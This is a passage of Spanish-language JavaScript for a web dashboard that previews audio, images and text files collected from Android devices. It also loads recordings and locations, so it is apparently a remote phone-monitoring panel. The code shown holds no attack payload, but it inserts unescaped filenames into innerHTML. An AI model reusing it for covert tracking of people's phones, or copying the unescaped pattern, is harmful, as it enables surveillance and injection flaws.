  modalFilemeta.textContent = `${sizeStr} • Dispositivo: ${file.deviceName || 'Android'} • ${file.remotePath || ''}`;
  modalDownloadBtn.href = `/api/files/download/${file.filename}`;
  modalDownloadBtn.download = file.originalName || file.filename;

  const isImage = file.isImage || /\.(jpg|jpeg|png|webp|gif|bmp)$/i.test(file.filename || file.originalName);
  const isAudio = /\.(m4a|mp3|wav|ogg|aac|3gp)$/i.test(file.filename || file.originalName);

  if (isImage) {
    modalTypeIcon.textContent = '🖼️';
    modalBodyContent.innerHTML = `
      <img src="/api/files/view/${file.filename}" alt="${escapeHtml(file.originalName)}" class="modal-preview-img" />
    `;
    filePreviewModal.classList.remove('hidden');
  } else if (isAudio) {
    modalTypeIcon.textContent = '🎵';
    modalBodyContent.innerHTML = `
      <audio controls autoplay src="/api/files/view/${file.filename}" style="width: 100%; max-width: 500px;"></audio>
    `;
    filePreviewModal.classList.remove('hidden');
  } else {
    // Treat as text / log / config
    modalTypeIcon.textContent = '📋';
    modalBodyContent.innerHTML = `<div class="pulsing-spinner"></div><p style="color:var(--text-dim);">Cargando contenido del archivo...</p>`;
    filePreviewModal.classList.remove('hidden');

    try {
      const res = await fetch(`/api/files/view/${file.filename}`);
      const text = await res.text();
      modalBodyContent.innerHTML = `
        <pre class="modal-preview-text"><code>${escapeHtml(text)}</code></pre>
      `;
    } catch (err) {
      modalBodyContent.innerHTML = `<p style="color: #ef4444;">Error al cargar vista previa del texto.</p>`;
    }
  }
};

modalCloseBtn.addEventListener('click', () => {
  filePreviewModal.classList.add('hidden');
  modalBodyContent.innerHTML = '';
});

filePreviewModal.addEventListener('click', (e) => {
  if (e.target === filePreviewModal) {
    filePreviewModal.classList.add('hidden');
    modalBodyContent.innerHTML = '';
  }
});

// Format utilities
function getFileIcon(name) {
  if (!name) return '📄';
  const ext = name.split('.').pop().toLowerCase();
  if (['jpg', 'jpeg', 'png', 'webp', 'gif', 'bmp'].includes(ext)) return '🖼️';
  if (['log', 'txt', 'json', 'xml', 'md'].includes(ext)) return '📋';
  if (['m4a', 'mp3', 'wav', 'ogg', 'aac'].includes(ext)) return '🎵';
  if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) return '🎬';
  if (['zip', 'rar', 'tar', 'gz'].includes(ext)) return '📦';
  if (['pdf'].includes(ext)) return '📑';
  return '📄';
}

function formatBytes(bytes) {
  if (bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function escapeJsString(str) {
  if (!str) return '';
  return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
}

function showToast(message, type = 'info') {
  if (!toastContainer) return;
  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;
  toast.textContent = message;
  toastContainer.appendChild(toast);
  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transition = 'opacity 0.5s ease';
    setTimeout(() => toast.remove(), 500);
  }, 4000);
}

// Helpers
function formatSeconds(sec) {
  const m = String(Math.floor(sec / 60)).padStart(2, '0');
  const s = String(sec % 60).padStart(2, '0');
  return `${m}:${s}`;
}

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// Initial Launch
connectWebSocket();
fetchRecordings();
fetchLocations();
fetchStoredFiles();
